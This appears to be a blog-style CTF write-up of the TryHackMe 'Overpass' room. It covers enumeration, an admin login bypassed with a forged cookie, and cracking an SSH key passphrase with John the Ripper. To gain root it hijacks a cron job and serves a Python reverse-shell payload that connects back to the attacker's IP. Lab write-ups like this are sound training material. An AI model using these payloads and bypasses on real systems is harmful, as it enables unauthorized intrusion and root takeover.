@@ -1,0 +1,104 @@
+---
+title: "Overpass TryHackMe"
+date: "08-05-2021"
+author: "Reda BELHAJ"
+summary: "What happens when some broke CompSci students make a password manager? room from TryHackme Created by NinjaJc01."
+tags: ["Tryhackme", "Ctf", "Writeup"]
+image: "/images/Overpass/bg.png"
+---
+Let’s take a look at the [Overpass CTF](https://tryhackme.com/room/overpass) on TryHackMe.
+
+## Enumeration
+### Nmap Scan
+The first step of my enumeration was a scan with **nmap**. by the command:
+
+```
+sudo nmap 10.10.184.21 -sC -sS -Pn
+```
+The “Nmap Output” displayed `2` services running under port 80 and 22 you guessed it's HTTP and SSH.
+![Nmap](/images/Overpass/nmap.jpg)
+Connecting to the HTTP port in a browser shows a web page that showcase the password manager tool
+
+### Gobuster Scan
+I next decided to run a gobuster scan on the webserver to see if there were any interesting hidden directories, by the command:
+
+```
+gobuster dir -u http://10.10.184.21/  -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,xml,php
+```
+![Gobuster](/images/Overpass/gobuster.jpg)
+
+## Exploring 
+So I found there was a hidden admin page at `/admin`. I tried some default password like `admin@admin` etc then I decided to take a look at the source code to observe how the login works
+![Login](/images/Overpass/loginjs.jpg)
+
+## Exploiting
+The function login() in the `login.js` script get 3 the username, the password and the loginStatus then assemble the credentials into a JS Object called `creds` and sends them to `/api/login` for validation then it checks if the credentials are valid, If the credentials are incorrect, it displays "Incorrect Credentials," but if they are correct, It saves a SessionToken cookie and redirects the user to /admin. So I decided to add a cookie with a random value using the web developer bar:
+![Cookie](/images/Overpass/cookie.jpg)
+
+## User Flag
+When I refresh the page we get a note to James and a SSH key, So I copy it and stores it in a file called `id_rsa`
+> Don't forget to change the permission of the file:
+
+```
+chmod 600 id_rsa
+```
+
+![PassPhrase](/images/Overpass/passphrase.jpg)
+
+When I tried to login I got a passphrase to enter, So let's crack it using **John the Ripper**:
+
+```
+python ssh2john.py /home/kali/id_rsa > /home/kali/hash
+```
+
+```
+john /home/kali/hash
+```
+
+![John](/images/Overpass/jhon.jpg)
+
+After brute-forcing the ssh private key passphrase. Now we can log in via SSH:
+![In](/images/Overpass/in.jpg)
+
+And we found the user Flag:
+
+```
+thm**********************************
+```
+
+## Root Flag
+In the same directory we found a todo file:
+![ToDo](/images/Overpass/todo.jpg)
+
+So in the last task they mentionned an automated script, and I though of cron and crontab:
+
+The software utility cron also known as **cron** job is a time-based job scheduler in Unix-like computer operating systems. And here's a [link](https://opensource.com/article/17/11/how-use-cron-linux) that teaches you how to use cron in Linux.
+
+Analyzing the crontab file reveals that root runs `buildscript.sh` every minute: 
+![Cron](/images/Overpass/crontab.jpg)
+
+So let's try to edit the ip address from `/etc/hosts` and try to create a local reverse shell :
+
+First of all I created a file in my local machine it's called `downloads/src/buildscript.sh` that have:
+
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.174.180",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+Then I started a local web server in the same port of Overpass 80 with Python:
+
+```
+sudo python3 -m http.server 80 
+```
+
+And I launched a netcat listener:
+
+```
+nc -nlvp 4444
+```
+
+Finally, we were able to connect to the Box as root and we found the root flag:
+
+```
+thm**********************************
+```
